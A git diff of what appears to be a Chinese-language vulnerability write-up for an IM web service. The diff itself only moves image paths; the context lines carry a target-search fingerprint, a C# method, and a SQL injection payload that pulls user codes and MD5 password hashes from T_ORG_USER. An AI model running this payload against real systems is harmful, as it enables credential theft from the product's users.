@@ -18,7 +18,7 @@ web.body="/Services/Identification/"
 
 登陆页面
 
-![image-20230828150337640](images/image-20230828150337640.png)
+![image-20230828150337640](../.gitbook/assets/image-20230828150337640.png)
 
 ```
 // GTP.IM.Services.Config.WebSite.WebService.IM.Config.ConfigService
@@ -47,7 +47,7 @@ public string GetIMDictionary(string key)
 }
 ```
 
-![image-20230828150533931](images/image-20230828150533931.png)
+![image-20230828150533931](../.gitbook/assets/image-20230828150533931.png)
 
 验证POC
 
@@ -59,4 +59,4 @@ Content-Type: application/x-www-form-urlencoded
 key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
 ```
 
-![image-20230828150553176](images/image-20230828150553176.png)
+![image-20230828150553176](../.gitbook/assets/image-20230828150553176.png)
